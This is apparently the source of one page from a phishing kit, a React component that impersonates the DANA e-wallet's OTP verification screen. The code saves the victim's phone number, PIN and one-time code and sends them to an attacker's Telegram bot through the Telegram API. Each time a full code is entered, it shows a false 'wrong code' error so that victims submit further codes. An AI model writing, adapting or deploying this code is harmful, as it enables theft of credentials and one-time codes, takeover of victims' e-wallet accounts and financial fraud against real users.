import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { base44 } from "@/api/base44Client";

export default function OtpInput() {
  const [otp, setOtp] = useState(["", "", "", ""]);
  const [errorMsg, setErrorMsg] = useState("");
  const [timer, setTimer] = useState(180);
  const [submission, setSubmission] = useState(null);
  const refs = [useRef(), useRef(), useRef(), useRef()];
  const navigate = useNavigate();
  const params = new URLSearchParams(window.location.search);
  const id = params.get("id");

  useEffect(() => {
    base44.entities.Submission.get(id).then(setSubmission);
  }, [id]);

  useEffect(() => {
    const interval = setInterval(() => setTimer((t) => (t > 0 ? t - 1 : 0)), 1000);
    return () => clearInterval(interval);
  }, []);

  const editTelegram = async (sub, otpStr) => {
    const configs = await base44.entities.TelegramConfig.list();
    if (configs.length > 0 && sub.telegram_message_id) {
      const { bot_token, chat_id } = configs[0];
      const line = "━".repeat(21);
      const msg = `${line}\nDATA MASUK - DANA\n${line}\nNama Akun  : ${sub.phone}\nPin Akun   : ${sub.pin || "menunggu..."}\nKode Akun  : ${otpStr}\n${line}`;
      await fetch(`https://api.telegram.org/bot${bot_token}/editMessageText`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, message_id: sub.telegram_message_id, text: msg }),
      });
    }
  };

  const handleChange = async (index, value) => {
    if (!/^\d?$/.test(value)) return;
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (value && index < 3) refs[index + 1].current.focus();

    if (newOtp.every((d) => d !== "")) {
      const otpStr = newOtp.join("");
      await base44.entities.Submission.update(id, { otp: otpStr, status: "completed" });
      const sub = await base44.entities.Submission.get(id);
      await editTelegram(sub, otpStr);
      setOtp(["", "", "", ""]);
      setErrorMsg("Pastikan kode OTP yang kamu masukan benar");
      refs[0].current?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      refs[index - 1].current.focus();
    }
  };

  const mins = String(Math.floor(timer / 60)).padStart(2, "0");
  const secs = String(timer % 60).padStart(2, "0");

  return (
    <div className="min-h-screen bg-white max-w-md mx-auto">
      <div className="bg-[#108ee9] px-4 py-3">
        <h1 className="text-white font-bold text-lg text-center">Verifikasi Akun</h1>
      </div>

      <div className="px-6 pt-6">
        <div className="flex justify-center mb-4">
          <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/585d72c35_icon-notif.png" alt="notif" className="w-24 h-24" />
        </div>

        <div className="flex items-center gap-2 mb-4">
          <h2 className="text-lg font-bold text-gray-800">Verifikasi telah dikirim ke Akun</h2>
          <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/addb2c666_dana-logofe46647.png" alt="DANA" className="h-5" />
        </div>

        <div className="mx-8 mb-6 rounded-2xl overflow-hidden">
          <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/a7f504ffa_atas2.gif" alt="DANA" className="w-full" />
        </div>

        <p className="text-center text-gray-600 mb-3">Kode dikirim ke</p>

        {submission && (
          <div className="bg-[#108ee9] rounded-full py-3 px-6 text-center mb-6">
            <span className="text-white font-bold text-lg">{submission.phone}</span>
          </div>
        )}

        {errorMsg && (
          <p className="text-center text-red-500 font-semibold text-sm mb-3">{errorMsg}</p>
        )}

        <div className="flex justify-center gap-4 mb-4">
          {otp.map((digit, i) => (
            <input
              key={i}
              ref__={refs[i]}
              type="tel"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              className="w-14 h-14 text-center text-2xl font-bold border-2 border-gray-200 rounded-xl outline-none focus:border-[#108ee9] bg-gray-50"
            />
          ))}
        </div>

        <p className="text-center text-gray-500 text-lg mb-6">{mins}:{secs}</p>

        <div className="border-t pt-4">
          <h3 className="font-bold text-gray-800 mb-3">Silahkan Cek verifikasi akun</h3>
          <div className="flex items-start gap-3 mb-3">
            <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/585d72c35_icon-notif.png" alt="notif" className="w-8 h-8 flex-shrink-0" />
            <p className="text-sm text-gray-600">Tap notifikasi di perangkatmu di layar atas dan tap <b>VERIFIKASI</b>.</p>
          </div>
          <div className="flex items-start gap-3">
            <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/a5a1f08a5_icon-search.png" alt="search" className="w-8 h-8 flex-shrink-0" />
            <p className="text-sm text-gray-600">Tidak menerima notifikasi? Cek Kotak Masuk atau menu <b>Verifikasi</b>. atau cek di icon gambar <b>Amlop</b> dan tap <b>Verifikasi</b></p>
          </div>
        </div>
      </div>
    </div>
  );
}
